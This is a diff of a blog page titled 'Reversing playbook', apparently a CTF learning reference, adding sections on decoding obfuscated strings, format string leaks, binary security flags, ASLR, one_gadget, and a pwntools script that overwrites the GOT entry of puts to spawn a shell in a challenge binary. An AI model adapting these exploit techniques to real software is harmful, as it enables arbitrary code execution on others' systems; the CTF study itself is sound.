@@ -86,7 +86,7 @@
     
     <!-- Begin Jekyll SEO tag v2.7.1 -->
 <title>Reversing playbook | Adrian Galera blog</title>
-<meta name="generator" content="Jekyll v4.3.1" />
+<meta name="generator" content="Jekyll v4.3.2" />
 <meta property="og:title" content="Reversing playbook" />
 <meta property="og:locale" content="en_US" />
 <meta name="description" content="I keep this page as a reference to the steps I take to solve puzzles from https://www.hackthebox.com/" />
@@ -101,7 +101,7 @@
 <meta property="twitter:image" content="https://www.agalera.eu/assets/img/posts/hack-the-box-cheatsheet/featured.jpg" />
 <meta property="twitter:title" content="Reversing playbook" />
 <script type="application/ld+json">
-{"image":"https://www.agalera.eu/assets/img/posts/hack-the-box-cheatsheet/featured.jpg","url":"https://www.agalera.eu/reversing-playbook/","headline":"Reversing playbook","@type":"BlogPosting","datePublished":"2023-01-04T00:00:00+01:00","description":"I keep this page as a reference to the steps I take to solve puzzles from https://www.hackthebox.com/","dateModified":"2023-01-04T00:00:00+01:00","mainEntityOfPage":{"@type":"WebPage","@id":"https://www.agalera.eu/reversing-playbook/"},"@context":"https://schema.org"}</script>
+{"url":"https://www.agalera.eu/reversing-playbook/","@type":"BlogPosting","image":"https://www.agalera.eu/assets/img/posts/hack-the-box-cheatsheet/featured.jpg","description":"I keep this page as a reference to the steps I take to solve puzzles from https://www.hackthebox.com/","dateModified":"2023-01-04T00:00:00+01:00","datePublished":"2023-01-04T00:00:00+01:00","headline":"Reversing playbook","mainEntityOfPage":{"@type":"WebPage","@id":"https://www.agalera.eu/reversing-playbook/"},"@context":"https://schema.org"}</script>
 <!-- End Jekyll SEO tag -->
 
 
@@ -254,6 +254,12 @@
 <ol>
   <li><a href="#introduction">Introduction</a></li>
   <li><a href="#buffer-overflow">Buffer overflow</a></li>
+  <li><a href="#obfuscated">Obfuscated code</a></li>
+  <li><a href="#string-format">String format vulnerability</a></li>
+  <li><a href="#flags">Security flags</a></li>
+  <li><a href="#aslr">ASLR</a></li>
+  <li><a href="#one-gadget">one gadget</a></li>
+  <li><a href="#override-got">Overwrite Global Object Table</a></li>
 </ol>
 
 <h3 id="introduction-">Introduction <a name="introduction"></a></h3>
@@ -460,6 +466,142 @@ Legend: code, data, rodata, value
 <span class="n">r</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
 </code></pre></div></div>
 <p>Remember that we are jumping to flag() using RET. This means flag() will think itself have a return address. Therefore, we should pad with any 4 bytes of content before we write the 2 parameters.</p>
+
+<h3 id="obfusctaed-code-">Obfusctaed code <a name="obfuscated"></a></h3>
+
+<p>Sometimes, when trying to reverse the code, you might see strings that look very odd, e.g:</p>
+
+<p><code class="language-plaintext highlighter-rouge">3734203635203636203132322036352036382034382036352037342031</code>.</p>
+
+<p>This might be some string buf obfuscated somehow. So far, I found this kind of simple de-obfuscation (the plan is to keep updating this with more obfuscation techniques):</p>
+
+<ul>
+  <li>hex to decimal &gt; decimal to char &gt; decode all string in base64:</li>
+</ul>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">binascii</span>
+<span class="kn">import</span> <span class="nn">base64</span>
+
+<span class="k">def</span> <span class="nf">dec_to_chr</span><span class="p">(</span><span class="nb">str</span><span class="p">):</span>
+    <span class="k">return</span> <span class="s">""</span><span class="p">.</span><span class="n">join</span><span class="p">([</span><span class="nb">chr</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">s</span><span class="p">))</span> <span class="k">for</span> <span class="n">s</span> <span class="ow">in</span> <span class="nb">str</span><span class="p">.</span><span class="n">decode</span><span class="p">(</span><span class="s">'utf-8'</span><span class="p">).</span><span class="n">split</span><span class="p">(</span><span class="s">' '</span><span class="p">)])</span>
+
+<span class="n">base64text</span> <span class="o">=</span> <span class="s">""</span>
+<span class="n">base64text</span> <span class="o">=</span> <span class="n">base64text</span> <span class="o">+</span> <span class="n">dec_to_chr</span><span class="p">(</span><span class="n">binascii</span><span class="p">.</span><span class="n">unhexlify</span><span class="p">(</span><span class="s">"3734203635203636203132322036352036382034382036352037342031"</span><span class="p">)</span> <span class="o">+</span> <span class="n">binascii</span><span class="p">.</span><span class="n">unhexlify</span><span class="p">(</span><span class="s">"31392036352035312036352036382039392036352037362031303320363520353120363520363820383120363520373620313033"</span><span class="p">))</span>
+<span class="n">base64text</span> <span class="o">=</span> <span class="n">base64text</span> <span class="o">+</span> <span class="n">dec_to_chr</span><span class="p">(</span><span class="n">binascii</span><span class="p">.</span><span class="n">unhexlify</span><span class="p">(</span><span class="s">"3635203631"</span><span class="p">))</span>
+<span class="k">print</span><span class="p">(</span><span class="n">base64</span><span class="p">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">base64text</span><span class="p">).</span><span class="n">decode</span><span class="p">())</span>
+<span class="err">$</span><span class="n">s</span><span class="o">=</span><span class="s">'77.74.
+</span></code></pre></div></div>
+<p>In this case, this looks like the begining of a script trying to connect to an IP address.</p>
+
+<h3 id="string-format-vulnerability-">String format vulnerability <a name="string-format"></a></h3>
+
+<p>Some pieces of unsecure code, will print whatever the user is coding, see:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">"%299s"</span><span class="p">,</span><span class="n">local_148</span><span class="p">);</span>
+<span class="n">printf</span><span class="p">(</span><span class="n">local_148</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>If we’re a malicious user, can use that piece of code to leak memory addresses from the stack simply by using string format: <code class="language-plaintext highlighter-rouge">%p,%p,%p</code> will leak the first
+three memory positions in the stack: <code class="language-plaintext highlighter-rouge">0x1,0x1,0x7ffff7d14a37</code></p>
+
+<p>More info here: <a href="https://ctf101.org/binary-exploitation/what-is-a-format-string-vulnerability/">https://ctf101.org/binary-exploitation/what-is-a-format-string-vulnerability/</a></p>
+
+<p>More info about the possible formats: <a href="https://en.wikipedia.org/wiki/Printf_format_string">https://en.wikipedia.org/wiki/Printf_format_string</a></p>
+
+<h3 id="security-flags-">Security flags <a name="flags"></a></h3>
+
+<p>When a binary is generated, there are some flags that can be setup for security reasons, here are listed. To check it you can use <a href="https://github.com/slimm609/checksec.sh">checksec</a>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gal@gal-Modern-14-C12M:~/workspace/gal/blog<span class="nv">$ </span>checksec /usr/bin/ls
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="s1">'/usr/bin/ls'</span>
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+    FORTIFY:  Enabled
+</code></pre></div></div>
+
+<ul>
+  <li>RELRO: If there’s no <code class="language-plaintext highlighter-rouge">RELRO</code> protection, it means that the Global Object Table (<code class="language-plaintext highlighter-rouge">GOT</code>) is writtable. The GOT contains the memory address of the standard library methods. If you can override this, it means that when computer executes <code class="language-plaintext highlighter-rouge">puts</code>, will execute arbitrary code.</li>
+  <li>Stack: canary found, it means it hard to crash and gain code execution via buffer overflow.</li>
+  <li>NX: No code execution from the stack</li>
+  <li>PIE: executable is loaded at random address.</li>
+</ul>
+
+<p>More info: <a href="https://opensource.com/article/21/6/linux-checksec">https://opensource.com/article/21/6/linux-checksec</a></p>
+
+<h3 id="aslr-address-space-layout-randomisation">ASLR: Address Space Layout Randomisation<a name="aslr"></a></h3>
+
+<p>This is a technique used to avoid memory corruption attacks. In order to prevent an attacker from reliably jumping to, for example, a particular exploited function in memory, ASLR randomly arranges the address space positions of key data areas of a process, including the base of the executable and the positions of the stack, heap and libraries.</p>
+
+<p>In order to check if a exploit is stable, you can enable this in gdb, to check if your compter offset works in all situations:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gef➤  aslr on
+<span class="o">[</span>+] Enabling ASLR
+gef➤  start
+</code></pre></div></div>
+
+<h3 id="one-gadget">One gadget<a name="one-gadget"></a></h3>
+
+<p><a href="https://github.com/david942j/one_gadget">https://github.com/david942j/one_gadget</a></p>
+
+<p><code class="language-plaintext highlighter-rouge">libc</code> library has some pieces of code that runs a piece of code similar to <code class="language-plaintext highlighter-rouge">execve('/bin/sh', NULL, NULL)</code> which will lead to remote code execution.</p>
+
+<p>You can use the one gadget to know exactly the memory address you need to point to achive this RCE.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gal@gal-Modern-14-C12M:~/workspace/hackthebox/spooky-time/challenge<span class="nv">$ </span>one_gadget glibc/libc.so.6 
+0x50a37 posix_spawn<span class="o">(</span>rsp+0x1c, <span class="s2">"/bin/sh"</span>, 0, rbp, rsp+0x60, environ<span class="o">)</span>
+constraints:
+  rsp &amp; 0xf <span class="o">==</span> 0
+  rcx <span class="o">==</span> NULL
+  rbp <span class="o">==</span> NULL <span class="o">||</span> <span class="o">(</span>u16<span class="o">)[</span>rbp] <span class="o">==</span> NULL
+
+0xebcf1 execve<span class="o">(</span><span class="s2">"/bin/sh"</span>, r10, <span class="o">[</span>rbp-0x70]<span class="o">)</span>
+constraints:
+  address rbp-0x78 is writable
+  <span class="o">[</span>r10] <span class="o">==</span> NULL <span class="o">||</span> r10 <span class="o">==</span> NULL
+  <span class="o">[[</span>rbp-0x70]] <span class="o">==</span> NULL <span class="o">||</span> <span class="o">[</span>rbp-0x70] <span class="o">==</span> NULL
+
+0xebcf5 execve<span class="o">(</span><span class="s2">"/bin/sh"</span>, r10, rdx<span class="o">)</span>
+constraints:
+  address rbp-0x78 is writable
+  <span class="o">[</span>r10] <span class="o">==</span> NULL <span class="o">||</span> r10 <span class="o">==</span> NULL
+  <span class="o">[</span>rdx] <span class="o">==</span> NULL <span class="o">||</span> rdx <span class="o">==</span> NULL
+
+0xebcf8 execve<span class="o">(</span><span class="s2">"/bin/sh"</span>, rsi, rdx<span class="o">)</span>
+constraints:
+  address rbp-0x78 is writable
+  <span class="o">[</span>rsi] <span class="o">==</span> NULL <span class="o">||</span> rsi <span class="o">==</span> NULL
+  <span class="o">[</span>rdx] <span class="o">==</span> NULL <span class="o">||</span> rdx <span class="o">==</span> NULL
+</code></pre></div></div>
+
+<p>For every memory address, it also describe which value the register need to have in order to execute the RCE.</p>
+
+<h3 id="overwrite-global-object-table-">Overwrite Global Object Table <a name="override-got"></a></h3>
+
+<p>The global object table is used to dynamically resolve standard library functions (<code class="language-plaintext highlighter-rouge">scanf</code>, <code class="language-plaintext highlighter-rouge">printf</code>, etc…). If you can modify it, you can alias an arbitrary code as any standard library function. You can use this flaw plus the one gadge tool in the previous section to setup a Remote Code Execution.</p>
+
+<p>Below, you can find an example of how we can override the global object table using the one gadget tool:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">'./spooky_time'</span><span class="p">)</span>
+<span class="n">libc</span> <span class="o">=</span> <span class="n">context</span><span class="p">.</span><span class="n">binary</span><span class="p">.</span><span class="n">libc</span>
+
+<span class="n">r</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">'./spooky_time'</span><span class="p">)</span>
+
+<span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">'scary!</span><span class="se">\n\n</span><span class="s">'</span><span class="p">,</span> <span class="s">'%3$lx%51$lx'</span><span class="p">)</span>
+<span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">'than </span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
+<span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">recvn</span><span class="p">(</span><span class="mi">12</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1133111</span>
+<span class="n">elf</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">recvn</span><span class="p">(</span><span class="mi">12</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span> <span class="o">-</span> <span class="mi">5056</span>
+<span class="n">libc_one_gadget</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0xebcf5</span> <span class="c1"># libc.address + offset computed with one gadget tool
+</span>
+<span class="n">fmtstr_payload</span> <span class="o">=</span> <span class="n">fmtstr_payload</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="p">{</span><span class="n">elf</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="s">'puts'</span><span class="p">]</span> <span class="p">:</span> <span class="n">libc_one_gadget</span><span class="p">})</span> <span class="c1"># we make the function puts point to a RCE
+</span>
+<span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">'time..</span><span class="se">\n\n</span><span class="s">'</span><span class="p">,</span> <span class="n">fmtstr_payload</span><span class="p">)</span>
+
+<span class="n">r</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div></div>
 
     
   </section>
